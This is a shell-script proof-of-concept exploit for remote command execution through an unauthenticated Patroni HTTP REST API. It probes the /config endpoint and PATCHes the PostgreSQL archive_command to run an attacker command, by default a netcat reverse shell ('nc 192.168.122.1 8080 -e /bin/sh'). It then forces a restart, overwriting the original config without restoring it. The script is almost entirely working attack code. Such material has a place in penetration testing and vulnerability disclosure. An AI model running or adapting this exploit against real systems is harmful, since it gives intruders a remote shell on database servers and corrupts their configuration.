#!/usr/bin/sh

# Command to execute on vulnerable host
command="/usr/bin/nc 192.168.122.1 8080 -e /bin/sh" 

if [ $# -eq 0 ]; then
    echo "============================================="
    echo "= Patroni HTTP API Remote Command Execution ="
    echo "============================================="
    echo ""
    echo "[!] Use on your own risk! This script overwrites original postgresql config and doesn't restore it after work"
    echo ""
    echo "[?] Fix the \$command varialbe inside the script first"
    echo "[?] Then, execute the PoC with $0 <ip>:<http_api_port>"
    
    exit 0
fi

echo "[+] Checking the $1..."
status_code=$(curl -sI -o /dev/null -XPATCH -w "%{http_code}" http://$1/config)
if [ "$status_code" -eq "401" ]; then
	echo "[-] Patroni HTTP REST API on $1 is not vulnerable!"
	exit 0
fi

echo "[+] Patroni HTTP REST API on $1 looks vulnerable, sending PATCH request..."
patched_config=$(curl -s -XPATCH -d '{"postgresql":{"parameters":{"wal_level":"replica", "archive_mode":"always", "archive_command":"'"$command"'", "archive_timeout":"1"}}}' http://$1/config)

echo "[+] Initiating restart..."
curl -sI -o /dev/null -XPOST http://$1/restart

echo "[+] Done!"
